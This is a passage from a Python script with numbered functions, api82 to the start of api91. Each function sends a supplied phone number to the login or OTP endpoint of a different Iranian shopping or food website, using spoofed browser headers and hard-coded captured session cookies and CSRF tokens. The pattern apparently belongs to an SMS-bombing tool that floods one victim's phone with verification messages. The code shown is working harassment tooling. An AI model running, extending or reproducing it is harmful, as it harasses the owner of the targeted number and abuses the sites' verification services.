    data = f'------WebKitFormBoundaryuJnTu2FbQ7ZoLcJC\r\nContent-Disposition: form-data; name="telephone"\r\n\r\n{number}\r\n------WebKitFormBoundaryuJnTu2FbQ7ZoLcJC--\r\n'

    response = requests.post('https://shop.opco.co.ir/index.php?route=extension/module/login_verify/verify',
                             headers=headers, cookies=cookies, data=data)


def api82(number):
    cookies = {
        'wm1400': 'CfDJ8H4EwF3i8jNCqtIiLYlchXaH8hy4IBJATw0uqq115deBukqp2py3U3B4f3y7SNTIPvV1eUvtEC5NO9dNV1jfRyWxsn912atm3XYzBkwzxN5dDnKGUI0o1_COe2bF-WxEDTu1GmIr-1pgNN-iUsci9V8',
        'v_url': '%2F',
        'BasketID': '64291033',
        'checkTextTrnslateLan': 'fa',
        '.AspNetCore.Antiforgery.C8JE6cPNpd8': 'CfDJ8H4EwF3i8jNCqtIiLYlchXbfXocDrXoAZwBYmzixauSyXdr5O-0VT7RRIFwqB88-KFiHl8Lw82Z1EodxNw-ZraLc-XAvuucsZDdY1qHwsqyGqRyTolZloFJaGgNT5eqfo09j5_dIYBoPRzZPJ4OixV0',
        '.AspNetCore.Session': 'CfDJ8H4EwF3i8jNCqtIiLYlchXZZ3OjYz%2BECB05A0LoZ46MS01iOd1qvJR2Iu0d49km9ljLj2mvj9a3VaWeqMEMwQCFAAyHJ4bf6WNrf3gOcCK2c%2BPNQcoI%2FPb32evWGWwoOkbCoqwuEAthk6d1EfC7WUadOZicKT%2FS1KNVi%2FUOEcZhP',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': 'fb927ad2-fd7c-c393-c0e7-e0bb4e144f6e',
        'analytics_session_token': '0ed055e8-3aec-ef4e-0602-c0be3fce6e01',
        'yektanet_session_last_activity': '4/10/2022',
        '_yngt_iframe': '1',
        '_ga': 'GA1.2.1673134387.1649532999',
        '_gid': 'GA1.2.311232868.1649532999',
        '_gat_gtag_UA_162260606_1': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
    }

    headers = {
        'authority': 'atawich.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'wm1400=CfDJ8H4EwF3i8jNCqtIiLYlchXaH8hy4IBJATw0uqq115deBukqp2py3U3B4f3y7SNTIPvV1eUvtEC5NO9dNV1jfRyWxsn912atm3XYzBkwzxN5dDnKGUI0o1_COe2bF-WxEDTu1GmIr-1pgNN-iUsci9V8; v_url=%2F; BasketID=64291033; checkTextTrnslateLan=fa; .AspNetCore.Antiforgery.C8JE6cPNpd8=CfDJ8H4EwF3i8jNCqtIiLYlchXbfXocDrXoAZwBYmzixauSyXdr5O-0VT7RRIFwqB88-KFiHl8Lw82Z1EodxNw-ZraLc-XAvuucsZDdY1qHwsqyGqRyTolZloFJaGgNT5eqfo09j5_dIYBoPRzZPJ4OixV0; .AspNetCore.Session=CfDJ8H4EwF3i8jNCqtIiLYlchXZZ3OjYz%2BECB05A0LoZ46MS01iOd1qvJR2Iu0d49km9ljLj2mvj9a3VaWeqMEMwQCFAAyHJ4bf6WNrf3gOcCK2c%2BPNQcoI%2FPb32evWGWwoOkbCoqwuEAthk6d1EfC7WUadOZicKT%2FS1KNVi%2FUOEcZhP; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=fb927ad2-fd7c-c393-c0e7-e0bb4e144f6e; analytics_session_token=0ed055e8-3aec-ef4e-0602-c0be3fce6e01; yektanet_session_last_activity=4/10/2022; _yngt_iframe=1; _ga=GA1.2.1673134387.1649532999; _gid=GA1.2.311232868.1649532999; _gat_gtag_UA_162260606_1=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce',
        'origin': 'https://atawich.com',
        'referer': 'https://atawich.com/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'lazyLoad': 'true',
        'btnID': 'undefined',
    }

    data = {
        'PhoneNumber': number,
        'call': 'false',
        'data1': 'da0fa0f9-c854-40e2-9fc2-02608b8859e5',
        'data2': '637469158829958600',
        'ForgetPass': 'false',
    }

    response = requests.post('https://atawich.com/Account/FoodPhoneNumberVerification/', headers=headers, params=params,
                             cookies=cookies, data=data)


def api83(number):
    headers = {
        'authority': 'auth.basalam.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://basalam.com',
        'referer': 'https://basalam.com/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'x-client-info': '{"name":"web.public"}',
        'x-creation-tags': '{"app":"web","client":"customer","os":"windows","device":"desktop","uri":"/category/herbal","fullPath":"/category/herbal","tag":[null]}',
    }

    json_data = {
        'mobile': number,
        'client_id': 11,
    }

    response = requests.post('https://auth.basalam.com/otp-request', headers=headers, json=json_data)


def api84(number):
    cookies = {
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': '8897bc86-24ea-5aab-1db6-7ef688435e12',
        'analytics_session_token': '5d36f0e3-5d58-ef67-8afc-d56c5cdbae2c',
        'yektanet_session_last_activity': '4/10/2022',
        '_yngt_iframe': '1',
        '_ga': 'GA1.2.19758480.1649611325',
        '_gid': 'GA1.2.448418168.1649611325',
        '_gat_gtag_UA_157028059_1': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        'XSRF-TOKEN': 'eyJpdiI6IlpNWFRWSEVIRVlVL2ErY1FOalNKTVE9PSIsInZhbHVlIjoiaHpkbjlTMTkrdmhUdjMyY2tRQXpMNGxEdTVySmpTYmdkQXc0MnMxdnB4SEg4c3lLejdTdGxLdE9DMEtlMTFuS3NFaEpLRWNsb1IxUzIxUWdOcFFiVmx0QVpCbUlXY1c2UFJKK2VlcFFsdkxqd0FVdSs2djJrUmtTVjZ4ZVV3d1MiLCJtYWMiOiI3YTczNzJlMDJhMTA2MTIwMjMyZTEyYmQxMjA3ZDA1OWU4MDZkOWZlZGE4ZGVjZjBkNDk3OTI2NzZhZjdlNWYxIiwidGFnIjoiIn0%3D',
        'qazvinkharidv2_session': 'eyJpdiI6IjMzVkxIbllZTnlvY1FmUFJLSUl1VFE9PSIsInZhbHVlIjoiL01vV3NCSnhIZ25pT1ZpeDhTN0pPenpycGJpK201NVI1K0dKcGMxZTFGS0VTc2RFZmhnU3FiMm1MZDJueElHb3hzRkhMbzladGl3eTJjNU5aVUNhNVc2MzhYaFM2ekxmUlZpNlA1TTZJbzlUY2wwK3lXMncvZTRrbnhaTHk0Vm8iLCJtYWMiOiIxZTViYjA2MjMyZjVmMDRjNzM2OWU3ZDgwNWIzNDdhOTMyYmMwM2ViODlhNzcxOTFmZmFiZjE2YWIxMTE1NDU5IiwidGFnIjoiIn0%3D',
    }

    headers = {
        'authority': 'qazvinkharid.com',
        'accept': 'text/html, application/xhtml+xml',
        'accept-language': 'en-US,en;q=0.9',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=8897bc86-24ea-5aab-1db6-7ef688435e12; analytics_session_token=5d36f0e3-5d58-ef67-8afc-d56c5cdbae2c; yektanet_session_last_activity=4/10/2022; _yngt_iframe=1; _ga=GA1.2.19758480.1649611325; _gid=GA1.2.448418168.1649611325; _gat_gtag_UA_157028059_1=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; XSRF-TOKEN=eyJpdiI6IlpNWFRWSEVIRVlVL2ErY1FOalNKTVE9PSIsInZhbHVlIjoiaHpkbjlTMTkrdmhUdjMyY2tRQXpMNGxEdTVySmpTYmdkQXc0MnMxdnB4SEg4c3lLejdTdGxLdE9DMEtlMTFuS3NFaEpLRWNsb1IxUzIxUWdOcFFiVmx0QVpCbUlXY1c2UFJKK2VlcFFsdkxqd0FVdSs2djJrUmtTVjZ4ZVV3d1MiLCJtYWMiOiI3YTczNzJlMDJhMTA2MTIwMjMyZTEyYmQxMjA3ZDA1OWU4MDZkOWZlZGE4ZGVjZjBkNDk3OTI2NzZhZjdlNWYxIiwidGFnIjoiIn0%3D; qazvinkharidv2_session=eyJpdiI6IjMzVkxIbllZTnlvY1FmUFJLSUl1VFE9PSIsInZhbHVlIjoiL01vV3NCSnhIZ25pT1ZpeDhTN0pPenpycGJpK201NVI1K0dKcGMxZTFGS0VTc2RFZmhnU3FiMm1MZDJueElHb3hzRkhMbzladGl3eTJjNU5aVUNhNVc2MzhYaFM2ekxmUlZpNlA1TTZJbzlUY2wwK3lXMncvZTRrbnhaTHk0Vm8iLCJtYWMiOiIxZTViYjA2MjMyZjVmMDRjNzM2OWU3ZDgwNWIzNDdhOTMyYmMwM2ViODlhNzcxOTFmZmFiZjE2YWIxMTE1NDU5IiwidGFnIjoiIn0%3D',
        'origin': 'https://qazvinkharid.com',
        'referer': 'https://qazvinkharid.com/?type=rest',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'x-csrf-token': 'g0dyZZQUGuAqKgTLfJCItAYy0rwUA4FH3nP13eOP',
        'x-livewire': 'true',
    }

    json_data = {
        'fingerprint': {
            'id': 'NWPmUKI2S79Rykn5dwFH',
            'name': 'login-form',
            'locale': 'en',
            'path': '/',
            'method': 'GET',
        },
        'serverMemo': {
            'children': [],
            'errors': [],
            'htmlHash': '94cc2ca4',
            'data': {
                'errormobile': False,
                'citySection': [
                    [],
                    [],
                    [],
                    [],
                    [],
                ],
                'mobile': None,
                'melicode': None,
                'personcode': None,
                'code': None,
                'firstname': None,
                'lastname': None,
                'gender': None,
                'user': None,
                'step': 0,
                'temp': 0,
                'retry': 0,
            },
            'dataMeta': {
                'modelCollections': {
                    'citySection': {
                        'class': 'App\\Models\\CitySection',
                        'id': [
                            1,
                            2,
                            3,
                            4,
                            36,
                        ],
                        'relations': [],
                        'connection': 'pgsql',
                    },
                },
            },
            'checksum': 'fc050c961e71ed80376563e8a9df3cf98b6b63cc9f14b364b6d16da8a8fb7cd4',
        },
        'updates': [
            {
                'type': 'syncInput',
                'payload': {
                    'name': 'mobile',
                    'value': number,
                },
            },
            {
                'type': 'callMethod',
                'payload': {
                    'method': 'submitLogin',
                    'params': [],
                },
            },
        ],
    }

    response = requests.post('https://qazvinkharid.com/livewire/message/login-form', headers=headers, cookies=cookies,
                             json=json_data)


def api85(number):
    cookies = {
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': '873e74a2-a95c-c0a7-4159-a872ce2c4bf1',
        'analytics_session_token': 'abedf46e-a6d0-9d25-ddc0-4ce2e8964860',
        'yektanet_session_last_activity': '4/10/2022',
        '_yngt_iframe': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        '_gid': 'GA1.2.1216609821.1649611472',
        '_clck': '1hvzasz|1|f0i|0',
        'XSRF-TOKEN': 'eyJpdiI6InJ0ZVdCR1BjbHlWMC9YVmRWYVhLUFE9PSIsInZhbHVlIjoibmExOXBOTThGUUhNeUYzN3ZjZDBSRDFwVUpncGVpb1lPS0tOenljME1rV3RjWmRtUjIyQ2g4WVFtQ0NVbzBRWFFHRFhLb1VNSit4ZngxUk8vT1hvUGhNN2I1a0xuUGdpaDQ4d09Sa0xRSEdQeU02VUdwM0RONXkvb1ZiRmZhMloiLCJtYWMiOiIyZjY3MjhhN2MzZDk5NzU2ZWE2NGU2MzZhOTUyZWQ3NzM0Yjc4YzQxMGQ2MjczMTNkYjIzYTE4NDg1ZmI1ZmYyIn0%3D',
        'laravel_session': 'eyJpdiI6IlNuRG9LcmFlSVVZQjdFcEdicW51ZlE9PSIsInZhbHVlIjoib1RNdDd4Q1g2ZEF6NHpCOUVBSDhldi84WjE3b1dHQ2tzZ21ibGdqVkRiWkxvaFlJWldWcUZ3RERSY3FWdDhoWVpsRkN4bmZXSktXbjVzaVdtL1EycDNHZ1ZZRVF0TnR5aWVuK3duT1BTbXdCcW5LblFoZDJxc3JlT2FsRmhJRDgiLCJtYWMiOiI1MGFkNjdkNWJhMTA2NTkwMTk4M2ZiMjBiOWUwNjNlMGI4Y2ExM2Y4OTdhMzllMjUxYTc5YWI1MDZlYTNjZGMwIn0%3D',
        '_ga_1VGK17BQBX': 'GS1.1.1649611470.1.1.1649613608.0',
        '_ga': 'GA1.2.725723255.1649611471',
        '_gat_gtag_UA_129499538_1': '1',
        '_clsk': '11myqrp|1649613609739|7|1|a.clarity.ms/collect',
    }

    headers = {
        'authority': 'www.inchand.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=873e74a2-a95c-c0a7-4159-a872ce2c4bf1; analytics_session_token=abedf46e-a6d0-9d25-ddc0-4ce2e8964860; yektanet_session_last_activity=4/10/2022; _yngt_iframe=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; _gid=GA1.2.1216609821.1649611472; _clck=1hvzasz|1|f0i|0; XSRF-TOKEN=eyJpdiI6InJ0ZVdCR1BjbHlWMC9YVmRWYVhLUFE9PSIsInZhbHVlIjoibmExOXBOTThGUUhNeUYzN3ZjZDBSRDFwVUpncGVpb1lPS0tOenljME1rV3RjWmRtUjIyQ2g4WVFtQ0NVbzBRWFFHRFhLb1VNSit4ZngxUk8vT1hvUGhNN2I1a0xuUGdpaDQ4d09Sa0xRSEdQeU02VUdwM0RONXkvb1ZiRmZhMloiLCJtYWMiOiIyZjY3MjhhN2MzZDk5NzU2ZWE2NGU2MzZhOTUyZWQ3NzM0Yjc4YzQxMGQ2MjczMTNkYjIzYTE4NDg1ZmI1ZmYyIn0%3D; laravel_session=eyJpdiI6IlNuRG9LcmFlSVVZQjdFcEdicW51ZlE9PSIsInZhbHVlIjoib1RNdDd4Q1g2ZEF6NHpCOUVBSDhldi84WjE3b1dHQ2tzZ21ibGdqVkRiWkxvaFlJWldWcUZ3RERSY3FWdDhoWVpsRkN4bmZXSktXbjVzaVdtL1EycDNHZ1ZZRVF0TnR5aWVuK3duT1BTbXdCcW5LblFoZDJxc3JlT2FsRmhJRDgiLCJtYWMiOiI1MGFkNjdkNWJhMTA2NTkwMTk4M2ZiMjBiOWUwNjNlMGI4Y2ExM2Y4OTdhMzllMjUxYTc5YWI1MDZlYTNjZGMwIn0%3D; _ga_1VGK17BQBX=GS1.1.1649611470.1.1.1649613608.0; _ga=GA1.2.725723255.1649611471; _gat_gtag_UA_129499538_1=1; _clsk=11myqrp|1649613609739|7|1|a.clarity.ms/collect',
        'origin': 'https://www.inchand.com',
        'referer': 'https://www.inchand.com/cart',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'x-csrf-token': 'fuENv14y5tobI2uV4EzWQELElJDKAl6BQWQGb32N',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': 'eyJpdiI6InJ0ZVdCR1BjbHlWMC9YVmRWYVhLUFE9PSIsInZhbHVlIjoibmExOXBOTThGUUhNeUYzN3ZjZDBSRDFwVUpncGVpb1lPS0tOenljME1rV3RjWmRtUjIyQ2g4WVFtQ0NVbzBRWFFHRFhLb1VNSit4ZngxUk8vT1hvUGhNN2I1a0xuUGdpaDQ4d09Sa0xRSEdQeU02VUdwM0RONXkvb1ZiRmZhMloiLCJtYWMiOiIyZjY3MjhhN2MzZDk5NzU2ZWE2NGU2MzZhOTUyZWQ3NzM0Yjc4YzQxMGQ2MjczMTNkYjIzYTE4NDg1ZmI1ZmYyIn0=',
    }

    json_data = {
        'mobile': number,
    }

    response = requests.post('https://www.inchand.com/otp', headers=headers, cookies=cookies, json=json_data)


def api86(number):
    cookies = {
        'PHPSESSID': '485ca132d7b250166c51b4e445ca056e',
    }

    headers = {
        'authority': 'www.irankala.ir',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=485ca132d7b250166c51b4e445ca056e',
        'origin': 'https://www.irankala.ir',
        'referer': 'https://www.irankala.ir/login',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'Mobile': number,
        'Code': ' ',
        'MyCode': '',
    }

    response = requests.post('https://www.irankala.ir/send_code', headers=headers, cookies=cookies, data=data)


def api87(number):
    cookies = {
        '_ga': 'GA1.2.2022012391.1648803327',
        '__RequestVerificationToken': 'xTYdLow2Mb2C_IuG9C4tEBExU6yjnRBOzYGiIK7CH26kwl2vsoqQ1SNsnTh5iW4xla4ptofNX_m3s1C052XxRmlPrPtM87u5qaGKfsf7CGc1',
        '_gid': 'GA1.2.21649499.1649613938',
        '_gat_gtag_UA_164633799_1': '1',
    }

    headers = {
        'authority': 'www.mashadleather.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.2022012391.1648803327; __RequestVerificationToken=xTYdLow2Mb2C_IuG9C4tEBExU6yjnRBOzYGiIK7CH26kwl2vsoqQ1SNsnTh5iW4xla4ptofNX_m3s1C052XxRmlPrPtM87u5qaGKfsf7CGc1; _gid=GA1.2.21649499.1649613938; _gat_gtag_UA_164633799_1=1',
        'origin': 'https://www.mashadleather.com',
        'referer': 'https://www.mashadleather.com/Login?ReturnUrl=%2Fhistory',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    params = {
        'returnUrl': '/history',
    }

    data = {
        '__RequestVerificationToken': 'xy14sAxRM8f80OFbE7iLnH3VJg9HC6L41nvg2GhE3XbCgKTWnamM7sz6ywvQYypBiFG0TrrvTo4UcHWK4CSap85daIcgAt1bSSvN6Ise1s41',
        'CellNumber': number,
    }

    response = requests.post('https://www.mashadleather.com/Login', headers=headers, params=params, cookies=cookies,
                             data=data)


def api88(number):
    cookies = {
        '.Nop.Customer': '3e635478-4311-432c-96b0-4faa921b7eaa',
        '.Nop.Antiforgery': 'CfDJ8GMVO409LzhDin-MnhjEJKRcNnxRNCP1A2A1BSVv9b77KkXQCkv-724Xq_x9Bc8vWHAjdjyy_D8AAg_Y6yQ0maUp6qOShRnivv1-9eKbF2YRt_Nm4QFlLeD5kgbmlpwtdzNgUdXR_ovc_JGv39IssM4',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': 'ade28794-7df3-d413-9d97-9008fbdceb9f',
        'analytics_session_token': '500325f1-8b01-e5f4-c9ed-ab81e3577079',
        'yektanet_session_last_activity': '4/10/2022',
        '_yngt_iframe': '1',
        '__utma': '254345492.1255838606.1649614046.1649614046.1649614046.1',
        '__utmc': '254345492',
        '__utmz': '254345492.1649614046.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)',
        '__utmt': '1',
        '__utmb': '254345492.1.10.1649614046',
        '_ga': 'GA1.2.1255838606.1649614046',
        '_gid': 'GA1.2.1610651141.1649614046',
        '_gat_UA-69589910-2': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        '_clck': '1xmsm0n|1|f0i|0',
        '_clsk': '1ndqsoq|1649614049107|1|1|e.clarity.ms/collect',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary84nyPOKRpDlEH1o1',
        # Requests sorts cookies= alphabetically
        # 'Cookie': '.Nop.Customer=3e635478-4311-432c-96b0-4faa921b7eaa; .Nop.Antiforgery=CfDJ8GMVO409LzhDin-MnhjEJKRcNnxRNCP1A2A1BSVv9b77KkXQCkv-724Xq_x9Bc8vWHAjdjyy_D8AAg_Y6yQ0maUp6qOShRnivv1-9eKbF2YRt_Nm4QFlLeD5kgbmlpwtdzNgUdXR_ovc_JGv39IssM4; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=ade28794-7df3-d413-9d97-9008fbdceb9f; analytics_session_token=500325f1-8b01-e5f4-c9ed-ab81e3577079; yektanet_session_last_activity=4/10/2022; _yngt_iframe=1; __utma=254345492.1255838606.1649614046.1649614046.1649614046.1; __utmc=254345492; __utmz=254345492.1649614046.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=254345492.1.10.1649614046; _ga=GA1.2.1255838606.1649614046; _gid=GA1.2.1610651141.1649614046; _gat_UA-69589910-2=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; _clck=1xmsm0n|1|f0i|0; _clsk=1ndqsoq|1649614049107|1|1|e.clarity.ms/collect',
        'Origin': 'https://mashadkala.com',
        'Referer': 'https://mashadkala.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = f'------WebKitFormBoundary84nyPOKRpDlEH1o1\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n{number}\r\n------WebKitFormBoundary84nyPOKRpDlEH1o1\r\nContent-Disposition: form-data; name="ReturnUrl"\r\n\r\n\r\n------WebKitFormBoundary84nyPOKRpDlEH1o1\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nCfDJ8GMVO409LzhDin-MnhjEJKTSpAbh9AhoIghwNpL5FOV87YhXlBUzvW-xqVCy94-XjdBzv2-1EGJYLekeQq5NYryrxoS3DcZnQdIxSyxe97qPBWI6lE9hvqJWRAUJObqJlQB3WMRR-oLUMNu18gF3BG0\r\n------WebKitFormBoundary84nyPOKRpDlEH1o1\r\nContent-Disposition: form-data; name="step"\r\n\r\n1\r\n------WebKitFormBoundary84nyPOKRpDlEH1o1--\r\n'

    response = requests.post('https://mashadkala.com/Customer/ApiLoginFull', headers=headers, cookies=cookies,
                             data=data)


def api89(number):
    headers = {
        'authority': 'api.pelazio.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'fa',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://www.pelazio.com',
        'referer': 'https://www.pelazio.com/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'x-content': 'desktop',
        'x-country': 'ir',
        'x-locale': 'ir-fa',
        'x-user-agent': 'fd862f25-f2ab-4b20-bae9-f754a9cbab6b',
    }

    json_data = {
        'phone': number,
        'reset_password': False,
        'country_id': 9,
    }

    response = requests.post('https://api.pelazio.com/v1/customers/phone/verification/check', headers=headers,
                             json=json_data)


def api90(number):
    cookies = {
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': '704417ff-7abd-e616-5578-0f8ef10397a9',
        'analytics_session_token': '3fc749c5-ad7f-a6b7-342c-8a71f9283800',
        'yektanet_session_last_activity': '4/11/2022',
        '_yngt_iframe': '1',
        '__utma': '23667519.717458141.1649699266.1649699266.1649699266.1',
        '__utmc': '23667519',
        '__utmz': '23667519.1649699266.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)',
        '__utmt': '1',
        '__utmb': '23667519.1.10.1649699266',
        'LocalstorageExpireTimeVer22.7': 'true',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        '_gcl_au': '1.1.1735855820.1649699266',
        '_ga': 'GA1.2.717458141.1649699266',
        '_gid': 'GA1.2.588605148.1649699266',
    }

    headers = {
        'authority': 'tikban.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=704417ff-7abd-e616-5578-0f8ef10397a9; analytics_session_token=3fc749c5-ad7f-a6b7-342c-8a71f9283800; yektanet_session_last_activity=4/11/2022; _yngt_iframe=1; __utma=23667519.717458141.1649699266.1649699266.1649699266.1; __utmc=23667519; __utmz=23667519.1649699266.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=23667519.1.10.1649699266; LocalstorageExpireTimeVer22.7=true; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; _gcl_au=1.1.1735855820.1649699266; _ga=GA1.2.717458141.1649699266; _gid=GA1.2.588605148.1649699266',
        'currency': 'IRR',
        'origin': 'https://tikban.com',
        'referer': 'https://tikban.com/Account/Affiliate',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'phoneNumberCode': '+98',
        'CellPhone': number,
        'JustMobilephone': number,
    }

    response = requests.post('https://tikban.com/Account/LoginAndRegister', headers=headers, cookies=cookies,
                             json=json_data)


def api91(number):
    cookies = {
        '_gcl_au': '1.1.1586483943.1644073450',
        '_ga': 'GA1.2.434054867.1644073452',
        '__auc': 'de08ba5317eca6a1564340b1bf9',
